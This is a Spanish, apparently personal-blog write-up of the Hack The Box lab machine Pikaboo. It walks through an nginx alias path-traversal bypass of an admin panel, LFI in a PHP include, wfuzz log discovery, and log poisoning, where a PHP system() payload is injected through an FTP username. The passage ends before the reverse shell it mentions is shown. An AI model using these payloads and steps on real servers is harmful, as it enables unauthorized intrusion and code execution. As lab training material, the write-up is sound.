&lt;/div&gt;&lt;h1 id=&#34;bypass-panel---nginx&#34;&gt;Bypass Panel - nginx&lt;/h1&gt;
&lt;h2 id=&#34;panel&#34;&gt;PANEL&lt;/h2&gt;
&lt;p&gt;Las direcciones de administracion presentan &lt;a href=&#34;https://en.wikipedia.org/wiki/Basic_access_authentication&#34;&gt;Autenticacion Basica&lt;/a&gt;. Intentamos realizar un ataque de fuerza bruta con los nombres en &amp;ldquo;Pokatdex&amp;rdquo; pero no resulto nada. AdemÃ¡s vemos que las solicitudes del panel se realizan hacia &lt;code&gt;127.0.0.1:81&lt;/code&gt; atraves de &lt;code&gt;Apache&lt;/code&gt;, tal vez es algun tipo de Proxy configurado en Nginx hacia Apache.&lt;/p&gt;
&lt;p&gt;La version de la maquina es &lt;code&gt;1.14.2&lt;/code&gt; es inferior a la version estable actual lo que podria suponer algun tipo de vulnerabilidad, tomando en cuenta esto y el &amp;ldquo;Proxy&amp;rdquo; nos llevÃ³ a &lt;strong&gt;Nginx misconfigurations&lt;/strong&gt; ( &lt;a href=&#34;https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/&#34;&gt;1&lt;/a&gt;, &lt;a href=&#34;https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/&#34;&gt;2&lt;/a&gt;, &lt;a href=&#34;https://itzone.com.vn/en/article/common-nginx-misconfiguration-puts-your-web-server-at-risk-part-1/&#34;&gt;3&lt;/a&gt;, &lt;a href=&#34;https://www.youtube.com/watch?v=MQpw4oXjIqY&#34;&gt;4&lt;/a&gt;) y &lt;a href=&#34;https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/&#34;&gt;Reverse Proxy Attacks&lt;/a&gt;, similar a &lt;a href=&#34;https://sckull.github.io/posts/seal/#seal-market&#34;&gt;HTB - Seal&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;De cierta forma deberÃ­amos intentar realizar Bypass, en este caso en el panel de administracion, es por ello que tomamos en cuenta los &amp;ldquo;payloads&amp;rdquo; para Nginx y realizamos nuevamente una enumeracion de directorios con Feroxbuster.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; Ï€ ~/htb/pikaboo â¯ feroxbuster -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.10.10.249/admin../&amp;#34;&lt;/span&gt; -w &lt;span class=&#34;nv&#34;&gt;$MD&lt;/span&gt;

 ___  ___  __   __     __      __         __   ___
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /  &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;    /  &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_,    &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___
by Ben &lt;span class=&#34;s2&#34;&gt;&amp;#34;epi&amp;#34;&lt;/span&gt; Risher ğŸ¤“                 ver: 2.3.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://10.10.10.249/admin../
 ğŸš€  Threads               â”‚ &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt;
 ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ğŸ‘Œ  Status Codes          â”‚ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200, 204, 301, 302, 307, 308, 401, 403, 405&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
 ğŸ’¥  Timeout &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;        â”‚ &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.3.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”ƒ  Recursion Depth       â”‚ &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
 ğŸ‰  New Version Available â”‚ https://github.com/epi052/feroxbuster/releases/latest
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ENTER&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; to use the Scan Cancel Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
&lt;span class=&#34;m&#34;&gt;401&lt;/span&gt;       14l       54w      456c http://10.10.10.249/admin../admin
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;        9l       28w      314c http://10.10.10.249/admin../javascript
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;       93l      285w     4640c http://10.10.10.249/admin../server-status
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;####################] - 9m    220545/220545  0s      found:3       errors:0&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;####################] - 8m    220545/220545  408/s   http://10.10.10.249/admin../&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Se muestran algunas direcciones pero en &lt;code&gt;server-status&lt;/code&gt; observamos la direccion &lt;code&gt;/admin_stagin&lt;/code&gt; y las solicitudes hechas por feroxbuster.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pikaboo/Screenshot_20210721_174038.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al visitar &lt;code&gt;/admin_stagin&lt;/code&gt; nos redirige al puerto 81 de localhost, agregando &lt;code&gt;/&lt;/code&gt; al final nos muestra el contenido.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; Ï€ ~/htb/pikaboo â¯ curl -s http://10.10.10.249/admin../admin_staging
&amp;lt;!DOCTYPE HTML PUBLIC &lt;span class=&#34;s2&#34;&gt;&amp;#34;-//IETF//DTD HTML 2.0//EN&amp;#34;&lt;/span&gt;&amp;gt;
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;301 Moved Permanently&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;Moved Permanently&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;The document has moved &amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://127.0.0.1:81/admin_staging/&amp;#34;&lt;/span&gt;&amp;gt;here&amp;lt;/a&amp;gt;.&amp;lt;/p&amp;gt;
&amp;lt;hr&amp;gt;
&amp;lt;address&amp;gt;Apache/2.4.38 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Server at 127.0.0.1 Port 81&amp;lt;/address&amp;gt;
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
 Ï€ ~/htb/pikaboo â¯ curl -s http://10.10.10.249/admin../admin_staging/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; head
&amp;lt;!--
&lt;span class=&#34;o&#34;&gt;=========================================================&lt;/span&gt;
Material Dashboard - v2.1.2
&lt;span class=&#34;o&#34;&gt;=========================================================&lt;/span&gt;

Product Page: https://www.creative-tim.com/product/material-dashboard
Copyright &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; Creative Tim &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;https://www.creative-tim.com&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Coded by Creative &lt;span class=&#34;nv&#34;&gt;Tim&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;=========================================================&lt;/span&gt;
 Ï€ ~/htb/pikaboo â¯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Observamos informacion y multiples direcciones.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pikaboo/Screenshot_20210721_174913.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;lfi&#34;&gt;LFI&lt;/h1&gt;
&lt;p&gt;Tras cambiar a una direccion vemos que toma un archivo PHP y lo muestra en pantalla, lo que nos lleva a una vulnerabilidad LFI.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pikaboo/Screenshot_20210721_175024.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizando un wrapper de php, obtuvimos el codigo de &lt;code&gt;index.php&lt;/code&gt; donde vemos el codigo vulnerable.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/*php://filter/convert.base64-encode/resource=index.php*/&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;page&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; 
      &lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;page&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;  
      &lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;dashboard.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;lfi-log-poisoning&#34;&gt;LFI Log Poisoning&lt;/h2&gt;
&lt;p&gt;Utilizamos un &lt;a href=&#34;https://raw.githubusercontent.com/sckull/ctf-stuff/master/lfi_path.txt&#34;&gt;wordlist&lt;/a&gt; con WFFUZ y, encontramos algunos archivos de log.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; Ï€ ~/htb/pikaboo â¯ wfuzz -c -w file_inclusion_linux.txt --hl &lt;span class=&#34;m&#34;&gt;367&lt;/span&gt; -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.10.10.249/admin../admin_staging/index.php?page=FUZZ&amp;#34;&lt;/span&gt; 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.249/admin../admin_staging/index.php?page&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;FUZZ
Total requests: &lt;span class=&#34;nv&#34;&gt;2247&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;=====================================================================&lt;/span&gt;
ID           Response   Lines    Word       Chars       &lt;span class=&#34;nv&#34;&gt;Payload&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================================&lt;/span&gt;

000001803:   &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;999&lt;/span&gt; L    &lt;span class=&#34;m&#34;&gt;4802&lt;/span&gt; W     &lt;span class=&#34;m&#34;&gt;61821&lt;/span&gt; Ch    &lt;span class=&#34;s2&#34;&gt;&amp;#34;/var/log/dpkg.log&amp;#34;&lt;/span&gt;
000001974:   &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;413&lt;/span&gt; L    &lt;span class=&#34;m&#34;&gt;1670&lt;/span&gt; W     &lt;span class=&#34;m&#34;&gt;19803&lt;/span&gt; Ch    &lt;span class=&#34;s2&#34;&gt;&amp;#34;/var/log/vsftpd.log&amp;#34;&lt;/span&gt;
000001977:   &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;555&lt;/span&gt; L    &lt;span class=&#34;m&#34;&gt;1376&lt;/span&gt; W     &lt;span class=&#34;m&#34;&gt;162752&lt;/span&gt; Ch   &lt;span class=&#34;s2&#34;&gt;&amp;#34;/var/log/wtmp&amp;#34;&lt;/span&gt;

Total time: 73.18061
Processed Requests: &lt;span class=&#34;m&#34;&gt;2247&lt;/span&gt;
Filtered Requests: &lt;span class=&#34;m&#34;&gt;2244&lt;/span&gt;
Requests/sec.: 30.70485
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos algunas solicitudes en el log de FTP (vsftpd.log) aunque no vemos credenciales en texto plano. Realizamos una solicitud en el puerto FTP tomando como usuario un payload para verificar que el codigo en PHP sea ejecutado.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;whoami&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al verificar el log vemos que el usuario es &lt;code&gt;www-data&lt;/code&gt; por lo que ejecutamos una shell inversa.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log&lt;/span&gt;
Thu Jul &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 01:53:34 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;pid 6954&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; CONNECT: Client &lt;span class=&#34;s2&#34;&gt;&amp;#34;::ffff:10.10.14.24&amp;#34;&lt;/span&gt;
Thu Jul &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 01:53:34 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;pid 6954&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; FTP response: Client &lt;span class=&#34;s2&#34;&gt;&amp;#34;::ffff:10.10.14.24&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;220 (vsFTPd 3.0.3)&amp;#34;&lt;/span&gt;
Thu Jul &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 01:53:35 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;pid 6954&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; FTP command: Client &lt;span class=&#34;s2&#34;&gt;&amp;#34;::ffff:10.10.14.24&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;USER www-data
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;www-data&amp;#34;&lt;/span&gt;
Thu Jul &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 01:53:35 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;pid 6954&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;www-data
www-data&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; FTP response: Client &lt;span class=&#34;s2&#34;&gt;&amp;#34;::ffff:10.10.14.24&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;331 Please specify the password.&amp;#34;&lt;/span&gt;
Thu Jul &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 01:53:38 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;pid 6954&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;www-data
www-data&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; FTP command: Client &lt;span class=&#34;s2&#34;&gt;&amp;#34;::ffff:10.10.14.24&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;PASS &amp;lt;password&amp;gt;&amp;#34;&lt;/span&gt;
